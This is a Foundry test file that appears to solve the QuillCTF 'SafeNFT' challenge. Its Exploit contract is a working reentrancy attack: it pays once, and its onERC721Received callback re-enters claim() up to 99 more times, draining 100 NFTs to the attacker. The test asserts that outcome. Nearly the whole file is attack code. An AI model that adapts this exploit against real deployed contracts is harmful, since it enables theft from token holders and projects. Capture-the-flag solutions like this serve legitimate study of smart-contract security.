// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../../src/QuillCTF/SafeNFT.sol";

contract SafeNFTTest is Test {
    SafeNFT public safeNFT;
    Exploit public exploit;
    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = vm.addr(1); 
        attacker = vm.addr(2);
        vm.deal(attacker, 0.01 ether);

        vm.startPrank(deployer);
        safeNFT = new SafeNFT("SafeNFT", "SNFT", 0.01 ether);
        vm.stopPrank();

        vm.startPrank(attacker);
        exploit = new Exploit{value:0.01 ether}(safeNFT);
        vm.stopPrank();
    }

    function testSafeNFTExploit() public {   
        // Before exploit
        assertEq(safeNFT.balanceOf(attacker), 0);
        console.log("Before exploit NFT counts: ", safeNFT.balanceOf(attacker));

        // Exploit
        vm.startPrank(attacker);
        exploit.attack();
        vm.stopPrank();

        // After exploit
        assertEq(safeNFT.balanceOf(attacker), 100);
        console.log("After exploit NFT counts: ", safeNFT.balanceOf(attacker));
    }
}

contract Exploit {
    SafeNFT public safeNFT;
    address public attacker;
    uint256 public limit = 99;
    uint256 public count;

    constructor(SafeNFT _safeNFT) payable {
        safeNFT = _safeNFT;
        attacker = msg.sender;
    }

    function attack() public {
        safeNFT.buyNFT{value: 0.01 ether}();
        safeNFT.claim();
    }

    function reentrancy() internal {
        if (count < limit) {
            count++;
            safeNFT.claim();
        }
    }

    function onERC721Received(address, address, uint256 tokenId, bytes memory) public returns (bytes4) {
        safeNFT.transferFrom(address(this), attacker, tokenId);
        reentrancy();
        return this.onERC721Received.selector;
    }
}